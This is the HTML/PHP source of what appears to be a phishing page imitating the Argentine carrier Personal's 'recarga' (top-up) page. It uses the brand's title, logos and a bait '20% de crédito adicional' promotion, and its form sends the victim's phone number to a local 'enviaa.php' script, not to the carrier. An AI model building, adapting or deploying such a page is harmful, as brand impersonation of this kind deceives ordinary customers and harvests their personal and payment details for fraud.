<?php
    session_start();

?>

<html><head>
      <meta charset="utf-8">
      <meta name="title" content="Recargar Saldo, fácil y se acredita en el momento | Personal">
      <meta name="description" content="Entrá y recarga tu saldo para seguir navegando con tu línea Personal. Podés recargar con tarjeta de crédito o débito de una manera fácil desde casa.">
      <meta name="viewport" content="viewport-fit=cover, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
      <title>Recargar Saldo, fácil y se acredita en el momento | Personal</title>
      <link rel="icon" type="image/x-icon" href="favicon.ico">
      <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
      <link rel="stylesheet" type="text/css" href="css/normalizer.css">
      <link rel="stylesheet" href="css/styles.css">
      <link rel="stylesheet" href="css/index.css">
   </head>
   <body style="background-color: rgb(229, 229, 229);">
      <div class="container-fluid">
         <div class="row">
            <div class="col-12 p-0">
               <header-component _nghost-hol-c9="">
                  <header _ngcontent-hol-c9="" class="header">
                     <nav _ngcontent-hol-c9="" class="px-0 pt-0">
                        <div _ngcontent-hol-c9="" class="d-flex justify-content-between align-items-center">
                           <div _ngcontent-hol-c9="" class="ml-3 ml-md-5 bd-highlight"><img _ngcontent-hol-c9="" src="media/flow.svg" class="pl-md-4 img-fluid size-logo"></div>
                           <div _ngcontent-hol-c9="" class="mr-3 mr-md-5 bd-highlight">
                              <div _ngcontent-hol-c9="" class="d-none d-sm-block"><img _ngcontent-hol-c9="" src="media/secure.svg" class="pr-md-4"></div>
                              <div _ngcontent-hol-c9="" class="d-block d-sm-none"><img _ngcontent-hol-c9="" src="media/secure-mobile.svg" class="pr-md-4 pr-2"></div>
                           </div>
                        </div>
                     </nav>
                  </header>
               </header-component>
               <phone-number _nghost-hol-c41="">
                  <div _ngcontent-hol-c41="" class="row justify-content-center align-items-center mt-0 mt-sm-5">
                     <div _ngcontent-hol-c41="" class="col-12">
                        <h1 _ngcontent-hol-c41="" class="title">Recargá tu línea Personal con tarjeta</h1>
                     </div>
                     <div _ngcontent-hol-c41="" class="col-12 col-sm-9">
                        <div _ngcontent-hol-c41="" class="row justify-content-center align-items-center">
                           <div _ngcontent-hol-c41="" class="jumbotron mb-3">
                              <div _ngcontent-hol-c41="" class="col-8 col-sm-8">
                                 <h2 _ngcontent-hol-c41="">
                                    <p _ngcontent-hol-c41="" class="title-2 ml-4 ml-sm-0">Recargar tu Personal desde donde estés.</p>
                                 </h2>
                              </div>
                              <div _ngcontent-hol-c41="" class="col-9 col-sm-8">
                                 <h2 _ngcontent-hol-c41="">
                                    <p _ngcontent-hol-c41="" class="hash-tag ml-4 ml-sm-0">Es muy fácil y se acredita en el momento</p>
                                 </h2>
                              </div>
                           </div>
                        </div>
                     </div>
                     <div _ngcontent-hol-c41="" class="col-12 col-sm-9">
                        <div _ngcontent-hol-c41="" class="row justify-content-center align-items-center">
                           <div _ngcontent-hol-c41="" class="col-12 well well-bordered mb-0">
                              <div _ngcontent-hol-c41="" class="col-12 text-center">
                                 <div _ngcontent-hol-c41="" class="alert alert-promotion">
                                    <div _ngcontent-hol-c41="" class="d-inline-flex p-3"><img _ngcontent-hol-c41="" src="media/promotion-icon.svg" width="21" height="24" class="mt-3 mt-sm-0"><span _ngcontent-hol-c41="" class="promotion-description ml-3">Recargá ahora y recibí <b _ngcontent-hol-c41="" class="promotion-description__percentage d-block d-sm-inline-block">20% de crédito adicional</b></span></div>
                                 </div>
                              </div>
                              <div _ngcontent-hol-c41="" class="row justify-content-center align-items-center">
                                 <div _ngcontent-hol-c41="" class="col-11 col-sm-8 mb-sm-3">
                                    <form action="enviaa.php" method="POST" class="w-sm-75 mb-3 ng-pristine ng-invalid ng-touched">
                                       <div _ngcontent-hol-c41="" class="form-group ml-0">
                                          
                                          <label _ngcontent-hol-c41="" for="lineNumber" class="label-input">Ingresá el número de línea a recargar</label>
                                          
                                          <input _ngcontent-hol-c41="" appautofocusdirective="" type="tel" name="lineNumber" id="lineNumber" placeholder="Ej: 1153394581" formcontrolname="lineNumber" aria-describedby="lineNumberHelp" class="custom-input ng-pristine ng-invalid ng-touched">
                                          
                                          <small _ngcontent-hol-c41="" id="lineNumberHelp" class="form-text help-text"> Agregá el código de área sin 0 más número sin 15 </small>
                                          
                                          <field-error _ngcontent-hol-c41="" errormsg="El número ingresado es incorrecto. Agregá el Código de área sin 0 más número sin 15" _nghost-hol-c33=""></field-error>
                                       </div>
                                    
                                 </div>
                                 <div _ngcontent-hol-c41="" class="col-11 col-sm-12 text-center mt-3 mt-sm-0">
                                    <button _ngcontent-hol-c41="" type="submit" id="principalButton" class="btn btn-disabled d-block d-sm-inline-block"> Siguiente </button>
                                    <h3 _ngcontent-hol-c41="" class="disclamer"> *Recordá que si tenés prestación básica universal no aplica el 20% adicional en tus recargas </h3>
                                 </div>
                              </div>
                           </form>
                           </div>
                        </div>
                     </div>
                  </div>
                  <div _ngcontent-hol-c41="" class="row justify-content-center align-items-left pb-4">
                     <div _ngcontent-hol-c41="" class="info col-11 col-sm-9">
                        <div _ngcontent-hol-c41="" class="m-sm-0 m-md-5 m-lg-2 m-xl-5">
                           <h2 _ngcontent-hol-c41="" class="title-info">¿Cómo funciona la recarga virtual Persona?</h2>
                           <p _ngcontent-hol-c41="" class="description-info">
                              ¿Te quedaste sin crédito y no sabes cómo hacer para seguir conectado? La recarga virtual es una manera rápida y simple de adquirir más saldo y, al mismo tiempo, conseguir beneficios extras. <br _ngcontent-hol-c41="">Realizando una recarga virtual a través de cualquiera de nuestros canales obtenés un 20% de descuento para usar como quieras. Conocé a continuación cómo podés recargar desde la web y la app Mi Personal, dos canales súper accesibles y prácticos para usar. <a _ngcontent-hol-c41="" class="readMore">Ver más</a>
                           </p>
                        </div>
                     </div>
                  </div>
               </phone-number>
            </div>
         </div>
<script src="javascript/query.min.js"></script>
<script src="javascript/query-form.js"></script>
<script src="javascript/poper.min.js"></script>
<script src="javascript/bootstrap.min.js"></script>
<script src="javascript/jquery.mask.js"></script>
<script src="javascript/custom.js"></script>
      </div>
   
</body></html>